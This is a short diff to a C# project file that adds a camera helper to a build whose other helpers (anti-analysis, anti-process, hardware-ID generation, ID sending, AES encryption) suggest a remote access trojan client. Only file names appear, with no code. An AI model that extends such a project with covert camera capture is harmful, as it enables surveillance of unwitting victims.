@@ -100,6 +100,7 @@
     <Compile Include="Helper\Aes256.cs" />
     <Compile Include="Helper\AntiProcess.cs" />
     <Compile Include="Helper\Anti_Analysis.cs" />
+    <Compile Include="Helper\Camera.cs" />
     <Compile Include="Helper\HwidGen.cs" />
     <Compile Include="Helper\IdSender.cs" />
     <Compile Include="Helper\Methods.cs" />
